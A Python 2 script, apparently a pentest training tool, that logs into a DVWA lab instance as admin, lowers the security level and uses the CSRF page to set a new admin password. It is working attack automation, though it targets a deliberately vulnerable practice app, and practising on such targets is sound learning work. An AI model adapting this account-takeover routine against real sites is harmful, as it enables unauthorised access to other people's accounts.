#!/usr/bin/env python


from rainbow import colors
import mechanize
import sys
import time
import urllib2


respo = 200

if len(sys.argv) != 4:

	print colors.RED + "\n[!] Usage: [IP] [Password] [Level]" + colors.END
	print colors.B_WHITE+ "[!] The default password for the first time is: " + colors.RED + "password" + colors.END
	sys.exit()


url = "http://"+sys.argv[1]+"/dvwa/login.php"
username = "admin"
password = sys.argv[2]
levels = ['high', 'medium', 'low']

# Unpack tuple
high, medium, low = levels


fetch = mechanize.Browser()

def CheckLog():

	print colors.CYAN + '''
	   ______     ____        ___    
	  |  _ \ \   / /\ \      / / \   
	  | | | \ \ / /  \ \ /\ / / _ \  
	  | |_| |\ V /    \ V  V / ___ \ 
	  |____/  \_/      \_/\_/_/   \_\\

	  ____ ____  ____  _____ 
	 / ___/ ___||  _ \|  ___|
	| |   \___ \| |_) | |_   
	| |___ ___) |  _ <|  _|  
	 \____|____/|_| \_\_| 

	  Author: Reznov - Pentester and hacker
	  Website: http://xakepu.blogspot.com
	  Github: https://github.com/reznov11
	  Twitter: @pentester11  ''' + colors.END


  	try:

		link = urllib2.urlopen(url)
	
		if link.code == respo:
			
			print "\n[--] %s, Response: %s"%(url,str(respo))
			time.sleep(1)
			return
		
		else:
			
			print "\n[!] Can't open the link !!" %(str(link.code))
			time.sleep(1)
			exit(0)

	except urllib2.HTTPError, error:
		
		print "\n[!] Please check the link !"
		exit(0)

	except urllib2.URLError, error:
		
		print colors.RED_HL + "\n[!] Can't resolve the host at this moment !!" + colors.END
		exit(0)

def main():


	fetch.open(url)
	fetch.select_form(nr=0)
	fetch.form['username'] = username
	fetch.form['password'] = password
	fetch.submit()

	if "Welcome" in fetch.title():
		print colors.YELLOW + "\n[*] " + fetch.title() + colors.END
		time.sleep(1)

	else:
		print colors.RED + "\n[!] " + colors.END + "Check the username or password !!"
		exit(0)

	print "\n[?] Enter the security panel"
	time.sleep(2)

	new = fetch.click_link(text='DVWA Security')
	fetch.open(new)

	print colors.YELLOW + "\n[!] You're inside the security panel > " + fetch.title() + colors.END
	time.sleep(2)

	changeSec = "\n[+] Now change the security level to " + colors.RED + "%s"%sys.argv[3] + colors.END

	print changeSec
	time.sleep(2)

	try:

		fetch.select_form(nr=0)
		new1 = fetch.form['security'] = [sys.argv[3]]
		new2 = fetch.form['security']

		fetch.submit()
		print "\n[*] Security now is: " + colors.RED + " ,".join(new2) + colors.END
		time.sleep(1)

		if new2 == high:
			print colors.RED + "\n[!] " + colors.END + "Security Level Is High !!!"
			exit(0)

	except mechanize._form.ItemNotFoundError:
		print "\n[+] Please choose one of these levels > " + colors.MAGENTA_HL +\
		 ", ".join(levels) + colors.END
		exit(0)


	print colors.BLUE + "\n[+] Now lets change the password for %s" %username + colors.END
	time.sleep(2)

	new3 = fetch.click_link(text='CSRF')
	fetch.open(new3)
	fetch.select_form(nr=0)

	print colors.BLUE + "\n[!] Current password is: %s" %password + colors.END
	time.sleep(2)

	type1 = raw_input("\n[>] New Password: ")
	new4 = fetch.form['password_new'] = type1
	type2 = raw_input("\n[>] Confirm Password: ")
	new5 = fetch.form['password_conf'] = type2

	while type1 != type2:

		print colors.RED + "\n[!] Passwords did not match !!!" + colors.END
		
		type1 = raw_input("\n[>] New Password: ")
		new4 = fetch.form['password_new'] = type1
		
		type2 = raw_input("\n[>] Confirm Password: ")
		new5 = fetch.form['password_conf'] = type2


	fetch.submit()
	print colors.B_WHITE + "\n[--] Now wait to submit ..." + colors.END
	time.sleep(2)

	print "\n[*] Thats it you can login with the new password: " + colors.B_WHITE + "%s" %new5 + colors.END

if __name__ == "__main__":

	try:

		first = CheckLog()
		second = main()
		
		time.sleep(2)
		print colors.B_WHITE + "\n[*] Finished at %s "%time.strftime("%Y %X") + colors.END

	except KeyboardInterrupt :
		print colors.RED + "\n[-] You closed the tool !!!" + colors.END
